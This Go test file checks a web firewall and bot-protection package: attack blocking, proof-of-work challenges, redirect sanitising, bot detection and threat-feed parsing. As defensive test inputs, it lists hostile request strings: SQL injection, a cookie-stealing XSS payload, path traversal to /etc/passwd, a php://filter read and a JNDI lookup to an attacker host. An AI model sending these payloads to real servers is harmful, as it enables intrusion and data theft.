package guardian

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

func browserReq(host, ip, uri string) map[string][]string {
	return map[string][]string{
		"User-Agent":      {"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"},
		"Accept":          {"text/html,application/xhtml+xml"},
		"Accept-Language": {"en-US"},
		"Sec-Fetch-Mode":  {"navigate"},
		"Sec-Fetch-Site":  {"none"},
	}
}

func v1Store(t *testing.T) *Store {
	s := newStore(t, Config{})
	s.mu.RLock()
	cfg := s.cfg
	s.mu.RUnlock()
	cfg.Challenge.Hosts = []string{"web.test"}
	cfg.ThreatFeeds.Enabled = false
	if err := s.Update(cfg); err != nil {
		t.Fatal(err)
	}
	return s
}

func TestDefaultsV1EnableEverything(t *testing.T) {
	s := newStore(t, Config{})
	c := s.Snapshot()
	if !c.WAFEngine.Enabled || !c.BotProtection.Enabled || !c.Challenge.Enabled || !c.Behavior.Enabled || !c.ThreatFeeds.Enabled {
		t.Fatalf("v1 defaults not applied: %+v", c)
	}
	if c.BotProtection.BlockSearchEngines {
		t.Fatal("search engines blocked by default")
	}
	if st := s.WAFEngineStatus(); !st.Loaded {
		t.Fatalf("CRS not loaded: %s", st.Error)
	}
}

func TestCRSBlocksAttacksAndPassesNormalTraffic(t *testing.T) {
	s := v1Store(t)
	attacks := []string{
		"/item?id=1%20AND%20SLEEP(5)--",
		"/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
		"/download?file=../../../../etc/passwd",
		"/index.php?page=php://filter/convert.base64-encode/resource=index",
		"/?x=${jndi:ldap://evil.example/a}",
	}
	for _, u := range attacks {
		if d := s.Evaluate(req("api.test", "8.8.4.4", "Mozilla/5.0", u)); !d.Block {
			t.Errorf("CRS missed %s", u)
		}
	}
	normal := []string{
		"/api/events?cameras=FrontPorch&limit=50&include_thumbnails=0",
		"/api/FrontPorch/latest.jpg?h=360",
		"/vod/FrontPorch/start/1760000000/end/1760000600/index.m3u8",
		"/clips/review/thumb-FrontPorch-1760000000.123-abc.webp",
		"/api/review?before=1760000000&after=1759900000&reviewed=0",
		"/live/webrtc/api/ws?src=FrontPorch",
		"/assets/index-B9x_2a.js",
		"/search?q=O%27Brien%20and%20sons",
		"/_db/notes/_changes?feed=longpoll&since=12-g1AAAA&heartbeat=10000",
		"/api/agents/argus/messages?limit=50&before=2026-10-10T12%3A00%3A00Z",
	}
	for _, u := range normal {
		r := req("api.test", "8.8.4.4", "Mozilla/5.0", u)
		r.Header["Accept"] = []string{"*/*"}
		if d := s.Evaluate(r); d.Block {
			t.Errorf("false positive %s -> %s", u, d.Reason)
		}
	}
}

func TestChallengeRoundTrip(t *testing.T) {
	s := v1Store(t)
	ip := "8.8.4.4"
	r := req("web.test", ip, "", "/dashboard?x=1")
	r.Header = browserReq("web.test", ip, "/dashboard")
	d := s.Evaluate(r)
	if d.Kind != KindChallenge || len(d.Body) == 0 {
		t.Fatalf("expected challenge, got %+v", d.Reason)
	}
	m := regexp.MustCompile(`var C="([^"]+)",D=(\d+),R="([^"]*)"`).FindStringSubmatch(string(d.Body))
	if m == nil {
		t.Fatal("challenge params not found")
	}
	c, diff := m[1], m[2]
	n, _ := strconv.Atoi(diff)
	nonce := 0
	for ; ; nonce++ {
		sum := sha256.Sum256([]byte(c + strconv.Itoa(nonce)))
		if leadingZeroBits(sum[:]) >= n {
			break
		}
	}
	// A wrong nonce earns another challenge.
	bad := req("web.test", ip, "", verifyPath+"?c="+url.QueryEscape(c)+"&n=x&r="+m[3])
	bad.Header = browserReq("", "", "")
	if d := s.Evaluate(bad); d.Reason != "challenge-failed" {
		t.Fatalf("bad nonce: %s", d.Reason)
	}
	v := req("web.test", ip, "", verifyPath+"?c="+url.QueryEscape(c)+"&n="+strconv.Itoa(nonce)+"&r="+m[3])
	v.Header = browserReq("", "", "")
	d = s.Evaluate(v)
	if d.Kind != KindRedirect || d.Headers["Location"] != "/dashboard?x=1" {
		t.Fatalf("verify: %s %v", d.Reason, d.Headers)
	}
	cookie := strings.SplitN(d.Headers["Set-Cookie"], ";", 2)[0]
	r.Header["Cookie"] = []string{"other=1; " + cookie}
	if d := s.Evaluate(r); d.Block {
		t.Fatalf("cookie not accepted: %s", d.Reason)
	}
	// Cookie is bound to the browser and host.
	r2 := req("web.test", ip, "", "/")
	r2.Header = browserReq("", "", "")
	r2.Header["User-Agent"] = []string{"Mozilla/5.0 (Windows NT 10.0) Firefox/141.0"}
	r2.Header["Cookie"] = []string{cookie}
	if d := s.Evaluate(r2); d.Kind != KindChallenge {
		t.Fatalf("cookie replayed with another UA: %s", d.Reason)
	}
	// A solution can't be reused from another address.
	v.RemoteAddr = "8.8.8.8:1"
	if d := s.Evaluate(v); d.Reason != "challenge-failed" {
		t.Fatalf("solution replayed from another IP: %s", d.Reason)
	}
}

func TestChallengeJSMatchesGo(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not installed")
	}
	src := challengePage[strings.Index(challengePage, "var K="):strings.Index(challengePage, "var nonce=0;")]
	js := src + `
var inputs=JSON.parse(process.argv[2]);var out=[];
for(var s of inputs){var v=h(s);out.push(z(v)+":"+(v[0]>>>0).toString(16).padStart(8,"0")+(v[1]>>>0).toString(16).padStart(8,"0"));}
console.log(out.join(","));`
	f := t.TempDir() + "/sha.js"
	if err := os.WriteFile(f, []byte(js), 0o600); err != nil {
		t.Fatal(err)
	}
	inputs := []string{"", "abc", "1760000000.0011223344556677.0123456789abcdef0123456789abcdef42",
		strings.Repeat("x", 55), strings.Repeat("y", 56), strings.Repeat("z", 64), strings.Repeat("q", 130)}
	var want []string
	for i := 0; i < 3000; i++ {
		inputs = append(inputs, "c"+strconv.Itoa(i))
	}
	for _, in := range inputs {
		sum := sha256.Sum256([]byte(in))
		want = append(want, strconv.Itoa(min(leadingZeroBits(sum[:]), 64))+":"+hex.EncodeToString(sum[:8]))
	}
	argb, _ := json.Marshal(inputs)
	arg := string(argb)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, err := exec.CommandContext(ctx, node, f, arg).Output()
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			t.Fatalf("%v: %s", err, ee.Stderr)
		}
		t.Fatal(err)
	}
	got := strings.Split(strings.TrimSpace(string(out)), ",")
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("input %q: js %s go %s", inputs[i], got[i], want[i])
		}
	}
}

func TestSafeReturnPath(t *testing.T) {
	for in, want := range map[string]string{
		"/a?b=c": "/a?b=c", "//evil.com": "/", "/\\evil.com": "/", "https://evil.com": "/",
		"/x\r\nSet-Cookie: a": "/", verifyPath + "?c=1": "/", "": "/",
	} {
		if got := safeReturnPath(in); got != want {
			t.Errorf("%q -> %q", in, got)
		}
	}
}

func TestChallengeSkipsAppsAndAPIs(t *testing.T) {
	s := v1Store(t)
	ip := "8.8.4.4"
	// HA fetching a snapshot: no cookie, API path.
	r := req("web.test", ip, "HomeAssistant/2026.10 aiohttp/3.12", "/api/FrontPorch/latest.jpg")
	if d := s.Evaluate(r); d.Block {
		t.Errorf("HA api fetch blocked: %s", d.Reason)
	}
	// Browser XHR to the API (not a navigation).
	x := req("web.test", ip, "", "/api/events")
	x.Header = browserReq("", "", "")
	x.Header["Sec-Fetch-Mode"] = []string{"cors"}
	x.Header["Accept"] = []string{"application/json"}
	if d := s.Evaluate(x); d.Block {
		t.Errorf("XHR blocked: %s", d.Reason)
	}
	// Bearer-token client.
	a := req("web.test", ip, "curl/8.5", "/dashboard")
	a.Header["Authorization"] = []string{"Bearer abc"}
	if d := s.Evaluate(a); d.Block {
		t.Errorf("authorized client blocked: %s", d.Reason)
	}
	// LAN is never challenged.
	l := req("web.test", "192.168.1.50", "", "/")
	l.Header = browserReq("", "", "")
	if d := s.Evaluate(l); d.Block {
		t.Errorf("LAN challenged: %s", d.Reason)
	}
	// Non-challenge host untouched.
	o := req("other.test", ip, "", "/")
	o.Header = browserReq("", "", "")
	if d := s.Evaluate(o); d.Block {
		t.Errorf("other host challenged: %s", d.Reason)
	}
	// Static assets pass.
	st := req("web.test", ip, "", "/assets/app.js")
	st.Header = browserReq("", "", "")
	st.Header["Sec-Fetch-Mode"] = []string{"no-cors"}
	if d := s.Evaluate(st); d.Block {
		t.Errorf("asset blocked: %s", d.Reason)
	}
}

func TestBotChecks(t *testing.T) {
	s := v1Store(t)
	ip := "8.8.4.4"
	cases := map[string]string{
		"Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)":   "ai-scraper",
		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)": "seo-crawler",
		"Mozilla/5.0 HeadlessChrome/140.0 Safari/537.36":                     "headless-browser",
	}
	for ua, want := range cases {
		if d := s.Evaluate(req("api.test", ip, ua, "/")); d.Reason != want {
			t.Errorf("%s -> %q, want %q", ua, d.Reason, want)
		}
	}
	// Scripting library on a browser host, non-API path.
	if d := s.Evaluate(req("web.test", ip, "python-requests/2.32", "/")); d.Reason != "http-library" {
		t.Errorf("python-requests -> %q", d.Reason)
	}
	// Browser UA without browser headers.
	f := req("web.test", ip, "Mozilla/5.0 (X11; Linux) Chrome/140.0 Safari/537.36", "/x.js")
	if d := s.Evaluate(f); d.Reason != "fake-browser" {
		t.Errorf("fake browser -> %q", d.Reason)
	}
}

func TestFakeSearchEngine(t *testing.T) {
	s := v1Store(t)
	s.bots.lookupAddr = func(_ context.Context, ip string) ([]string, error) {
		if ip == "66.249.66.1" {
			return []string{"crawl-66-249-66-1.googlebot.com."}, nil
		}
		return []string{"host.evil.example."}, nil
	}
	s.bots.lookupIP = func(_ context.Context, h string) ([]net.IPAddr, error) {
		return []net.IPAddr{{IP: net.ParseIP("66.249.66.1")}}, nil
	}
	ua := "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
	if d := s.Evaluate(req("web.test", "66.249.66.1", ua, "/")); d.Block {
		t.Errorf("real googlebot blocked: %s", d.Reason)
	}
	if d := s.Evaluate(req("web.test", "8.8.4.4", ua, "/")); d.Reason != "fake-search-engine" {
		t.Errorf("fake googlebot -> %q", d.Reason)
	}
}

func TestFeedFiltering(t *testing.T) {
	nets := parseFeed([]byte("; comment\n1.2.3.0/24 ; SBL1\n10.0.0.0/8\n0.0.0.0/0\n104.16.0.0/13\n" +
		`{"cidr":"5.6.0.0/16","sblid":"x"}` + "\n9.9.9.9\n2001:db8::/32\n"))
	set := buildIPSet(nets, cloudflareNets(t))
	for ip, want := range map[string]bool{
		"1.2.3.4": true, "5.6.7.8": true, "9.9.9.9": true, "9.9.9.10": false,
		"10.1.1.1": false, "8.8.8.8": false, "104.16.1.1": false, "2001:db8::1": false,
	} {
		if got := set.contains(net.ParseIP(ip)); got != want {
			t.Errorf("%s: %v want %v", ip, got, want)
		}
	}
	bots := parseAIBots([]byte(`{"GPTBot":{},"Mozilla":{},"AI":{},"NewCrawler":{}}`))
	if strings.Join(bots, ",") != "gptbot,newcrawler" {
		t.Errorf("ai bots: %v", bots)
	}
}

func cloudflareNets(t *testing.T) []*net.IPNet {
	var out []*net.IPNet
	for _, r := range cloudflareRules {
		out = append(out, r.Net)
	}
	if len(out) == 0 {
		t.Fatal("no cloudflare ranges")
	}
	return out
}

func TestBehaviorBansCrawlers(t *testing.T) {
	s := v1Store(t)
	ip := "8.8.4.4"
	ua := "Mozilla/5.0 (X11; Linux) Chrome/140.0 Safari/537.36"
	var d Decision
	for i := 0; i < 60 && !d.Block; i++ {
		r := req("web.test", ip, ua, "/page"+strconv.Itoa(i)+".css")
		r.Header["Accept-Language"] = []string{"en"}
		r.Header["Sec-Fetch-Mode"] = []string{"no-cors"}
		d = s.Evaluate(r)
	}
	if d.Reason != "scraping-behavior" {
		t.Fatalf("crawler not caught: %q", d.Reason)
	}
	r := req("web.test", ip, ua, "/x")
	if d := s.Evaluate(r); !d.Block {
		t.Fatal("temp ban not applied")
	}
}
